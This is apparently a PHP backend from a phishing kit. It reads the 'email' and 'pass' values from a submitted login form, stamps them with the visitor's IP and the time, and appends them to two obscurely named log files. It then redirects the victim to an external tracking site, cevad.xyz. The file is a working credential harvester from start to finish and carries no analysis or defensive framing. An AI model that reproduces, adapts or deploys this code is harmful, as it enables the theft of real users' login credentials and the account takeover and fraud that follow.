<?php

 function getCounter($counterID)
{
	// each counter value is stored inside a unique file
	// We use $counterID as a part of the file name
	// Example: file name will be "counter1.txt" if $counterID is set to "1"

	$fileName = "counter".$counterID.".txt"; 

	if( file_exists($fileName) ) {
		list($numVisitors)=file($fileName); // Read contents from the file
	} else {
		$numVisitors=0; // This is the first time the page is accessed
	}

	$numVisitors=$numVisitors+1; // Increase the count

	$fil=fopen($fileName,"w"); 	// Open the file to replace old value
	fputs($fil,$numVisitors);  	// Write the new count to the file
	fclose($fil);				// Close the file
	return $numVisitors;		// Return the new count
}

$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message = "xxxxxxxxxxxxxxxx sengary  xxxxxxxxxxxxxxxx\n";
$message .= getCounter(1) . "\n" ;
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$message .= "----------\n";
$rnessage = "$message\n";
$file = fopen("dddeeasdsxxxdfflfl.txt","ab");
fwrite($file,$message);
fclose($file);

$messagee = "\n" ;
$messagee .= $_POST['email']." : ";
$messagee .= $_POST['pass']."\n";
$file = fopen("dddeeasdsxxxdfflfle.txt","ab");
fwrite($file,$messagee);
fclose($file);


header("Location: https://www.cevad.xyz/?sl=5251661-a5230&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}");


?>